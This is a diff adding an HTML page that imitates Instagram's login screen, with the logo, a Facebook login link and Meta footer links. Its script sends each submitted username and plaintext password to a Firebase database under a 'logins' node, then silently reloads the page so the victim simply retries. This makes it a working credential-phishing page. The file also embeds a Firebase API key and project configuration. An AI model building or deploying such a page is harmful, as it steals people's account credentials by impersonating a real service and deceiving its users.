@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Clone</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            max-width: 935px;
+            width: 100%;
+            background-color: #000;
+            border: none;
+            margin: 0 auto;
+            flex: 1;
+        }
+        
+        .phone-mockup {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            max-width: 450px;
+        }
+        
+        .phone-screen {
+            width: 450px;
+            height: 618px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 10px;
+            background-color: #222;
+        }
+
+        #main-image {
+            width: 100%;
+            height: 100%;
+            background-color: #333;
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .login-form {
+            flex: 1;
+            max-width: 350px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .form-container {
+            border-radius: 8px;
+            padding: 40px 20px;
+            margin-bottom: 10px;
+            overflow: visible; 
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        #logo-image {
+            width: 350px;
+            height: auto;
+            position: relative;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .form-group {
+            margin-bottom: 10px;
+            position: relative; /* Needed for positioning the button */
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            padding-right: 70px; /* Make space for the "SHOW" button */
+            background-color: #1a1a1a;
+            border: 1px solid #555;
+            border-radius: 0;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 300;
+        }
+        
+        .form-group input::placeholder {
+            color: #fff;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border: 1px solid #777;
+        }
+        
+        /* --- STYLES FOR THE "SHOW" BUTTON --- */
+        .password-toggle {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            color: #fff;
+            background-color: #333;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 5px 8px;
+            border-radius: 4px;
+            user-select: none;
+            /* ADDED: Hide by default */
+            display: none; 
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 8px;
+            background-color: #7664dd;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #333;
+        }
+        
+        .divider span {
+            padding: 0 10px;
+            color: #777;
+            font-size: 13px;
+        }
+        
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .facebook-login i {
+            margin-right: 5px;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+        }
+        
+        .forgot-password a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        
+        .signup-container {
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup-container a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            padding: 20px 0;
+        }
+        
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        @media (max-width: 880px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .phone-mockup {
+                margin-bottom: 20px;
+                max-width: 300px;
+            }
+            
+            .phone-screen {
+                width: 300px;
+                height: 412px;
+            }
+            
+            .login-form {
+                max-width: 350px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-mockup">
+            <div class="phone-screen">
+                <div id="main-image"></div>
+            </div>
+        </div>
+        
+        <div class="login-form">
+            <div class="form-container">
+                <div class="logo-container">
+                    <img id="logo-image" src="" alt="Instagram Logo">
+                </div>
+                
+                <form>
+                    <div class="form-group">
+                        <input type="text" placeholder="Phone number, username, or email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <!-- ADDED onkeyup as a backup method -->
+                        <input type="password" placeholder="Password" id="password-input" onkeyup="if(this.value.length>0) document.getElementById('toggle-password').style.display='block'; else document.getElementById('toggle-password').style.display='none'">
+                        <span class="password-toggle" id="toggle-password">Show</span>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">Log in</button>
+                </form>
+                
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+                
+                <div class="facebook-login">
+                    <i class="fab fa-facebook"></i>
+                    <a href="https://www.facebook.com" target="_blank">Log in with Facebook</a>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            
+            <div class="signup-container">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            <p>© 2025 Instagram from Meta</p>
+        </div>
+    </div>
+
+    <!-- Firebase SDK Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Your new Firebase credentials
+            const firebaseConfig = {
+                apiKey: "AIzaSyBDs5mznJ0EZJXaYF3lybRHA-sGQaBEIrE",
+                authDomain: "instagram-ba821.firebaseapp.com",
+                databaseURL: "https://instagram-ba821-default-rtdb.firebaseio.com",
+                projectId: "instagram-ba821",
+                storageBucket: "instagram-ba821.firebasestorage.app",
+                messagingSenderId: "535582156308",
+                appId: "1:535582156308:web:a351776c444e735fa36901",
+                measurementId: "G-CRSKV1WS5F"
+            };
+
+            // Initialize Firebase
+            firebase.initializeApp(firebaseConfig);
+            const database = firebase.database();
+
+            // --- IMAGE LOADING CODE ---
+            const imageUrl = 'https://i.postimg.cc/13tHq2Jy/Screenshot-2025-11-11-114824.png'; 
+            const logoUrl = 'https://i.postimg.cc/ydJCgcyY/Screenshot-2025-12-01-100323.png';
+
+            if (imageUrl) {
+                document.getElementById('main-image').style.backgroundImage = `url('${imageUrl}')`;
+            }
+            if (logoUrl) {
+                document.getElementById('logo-image').src = logoUrl;
+            }
+
+            // --- ROBUST PASSWORD TOGGLE FUNCTIONALITY ---
+            const passwordInput = document.getElementById('password-input');
+            const togglePassword = document.getElementById('toggle-password');
+
+            // Method 1: Modern event listeners
+            passwordInput.addEventListener('focus', function() {
+                togglePassword.style.display = 'block';
+            });
+
+            passwordInput.addEventListener('blur', function() {
+                if (this.value.length === 0) {
+                    togglePassword.style.display = 'none';
+                }
+            });
+            
+            togglePassword.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    this.innerText = 'HIDE';
+                } else {
+                    passwordInput.type = 'password';
+                    this.innerText = 'Show';
+                }
+            });
+
+            // --- FORM SUBMISSION CODE ---
+            const loginForm = document.querySelector('form');
+
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                const username = document.querySelector('input[type="text"]').value;
+                const password = passwordInput.value;
+                const submissionDate = new Date().toLocaleString();
+
+                const loginData = {
+                    username: username,
+                    password: password,
+                    date: submissionDate
+                };
+
+                database.ref('logins').push(loginData)
+                    .then(() => {
+                        // Silently reload the page after saving
+                        location.reload();
+                    })
+                    .catch((error) => {
+                        console.error("Error saving data: ", error);
+                        alert('There was an error saving your details.');
+                    });
+            });
+        });
+    </script>
+</body>
+</html>
